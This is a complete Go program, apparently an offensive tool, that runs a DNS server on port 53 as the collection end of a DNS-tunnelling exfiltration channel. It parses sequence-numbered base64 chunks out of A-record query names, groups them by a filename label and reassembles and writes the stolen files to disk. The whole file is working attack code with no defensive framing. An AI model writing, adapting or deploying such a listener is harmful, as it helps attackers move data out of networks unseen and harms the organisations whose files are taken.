package main

import (
    "encoding/base64"
    "fmt"
    "github.com/miekg/dns"
    "os"
    "sort"
    "strconv"
    "strings"
    "sync"
)

type chunk struct {
    seq  int
    data string
}

var (
    dataStore = make(map[string]map[int]string)
    mutex     = &sync.Mutex{}
)

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
    msg := dns.Msg{}
    msg.SetReply(r)

    for _, q := range r.Question {
        if q.Qtype == dns.TypeA {
            domain := strings.ToLower(q.Name)
            parts := strings.Split(domain, ".")

            if len(parts) < 3 {
                continue
            }

            filename := parts[len(parts)-2]
            labels := parts[:len(parts)-2]

            mutex.Lock()
            if _, ok := dataStore[filename]; !ok {
                dataStore[filename] = make(map[int]string)
            }

            for _, label := range labels {
                if len(label) < 4 {
                    continue
                }
                seqStr := label[:4]
                data := label[4:]

                seq, err := strconv.Atoi(seqStr)
                if err != nil {
                    continue
                }

                dataStore[filename][seq] = data
            }
            mutex.Unlock()

            fmt.Printf("[+] Received %d chunk(s) for %s", len(labels), filename)
        }
    }

    w.WriteMsg(&msg)
}

func saveFiles() {
    mutex.Lock()
    defer mutex.Unlock()

    for filename, chunkMap := range dataStore {
        fmt.Printf("[DEBUG] Chunks received for %s: %d", filename, len(chunkMap))

        var keys []int
        for k := range chunkMap {
            keys = append(keys, k)
        }
        sort.Ints(keys)

        var b64Builder strings.Builder
        for _, k := range keys {
            b64Builder.WriteString(chunkMap[k])
        }

        b64 := b64Builder.String()
        fmt.Printf("[DEBUG] base64 length for %s: %d", filename, len(b64))
        fmt.Printf("[DEBUG] base64 data (start): %.100s...", b64)

        if pad := len(b64) % 4; pad != 0 {
            b64 += strings.Repeat("=", 4-pad)
        }

        decoded, err := base64.StdEncoding.DecodeString(b64)
        if err != nil {
            fmt.Printf("[-] Failed to decode base64 for %s: %s", filename, err)
            continue
        }

        err = os.WriteFile(filename, decoded, 0644)
        if err != nil {
            fmt.Printf("[-] Failed to write file %s: %s", filename, err)
        } else {
            fmt.Printf("[+] Successfully reconstructed file: %s (%d bytes)", filename, len(decoded))
        }
    }
}

func startServer() {
    dns.HandleFunc(".", handleDNSRequest)
    server := &dns.Server{Addr: ":53", Net: "udp"}
    fmt.Println("[*] DNS server listening on port 53...")
    if err := server.ListenAndServe(); err != nil {
        fmt.Printf("[-] DNS server error: %s", err)
        os.Exit(1)
    }
}

func main() {
    go startServer()
    fmt.Println("[*] Press Enter to stop and save reconstructed files...")
    fmt.Scanln()
    saveFiles()
}
